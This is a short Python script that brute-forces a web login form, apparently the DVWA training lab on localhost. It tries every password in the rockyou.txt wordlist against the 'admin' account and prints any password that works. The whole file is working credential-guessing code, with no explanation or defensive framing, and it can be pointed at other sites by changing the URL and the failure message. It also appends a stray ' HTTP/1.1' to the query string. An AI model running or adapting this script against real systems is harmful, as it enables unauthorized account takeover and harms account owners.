#!/usr/bin/env python
import requests
target_url = "http://127.0.0.1/vulnerabilities/brute/"
cookies = {
    "security": "low",
    "PHPSESSID": "",
}
# Set the username to target
username = "admin"
#set path
password_file_path= "/usr/share/wordlists/rockyou.txt"

# Create a session
session = requests.Session()

# Load the password dictionary file
with open(password_file_path , "r", encoding="latin-1") as file:
    # read from the file and split it based on new line to put into object list
    passwords = file.read().splitlines()

# Iterate through each password in the dictionary
for password in passwords:
    
    
    brute= f'?username={username}&password={password}&Login=Login HTTP/1.1'
    # Send the login request
    response = session.get(target_url+brute , cookies=cookies)
    
    
    # Check the response to determine if the login was successful
    if "Username and/or password incorrect."  not in response.text:
        print("Login successful!")
        print("Username: " + username)
        print("Password: " + password)
        break
    else:
        print("Login failed with password: " + password)
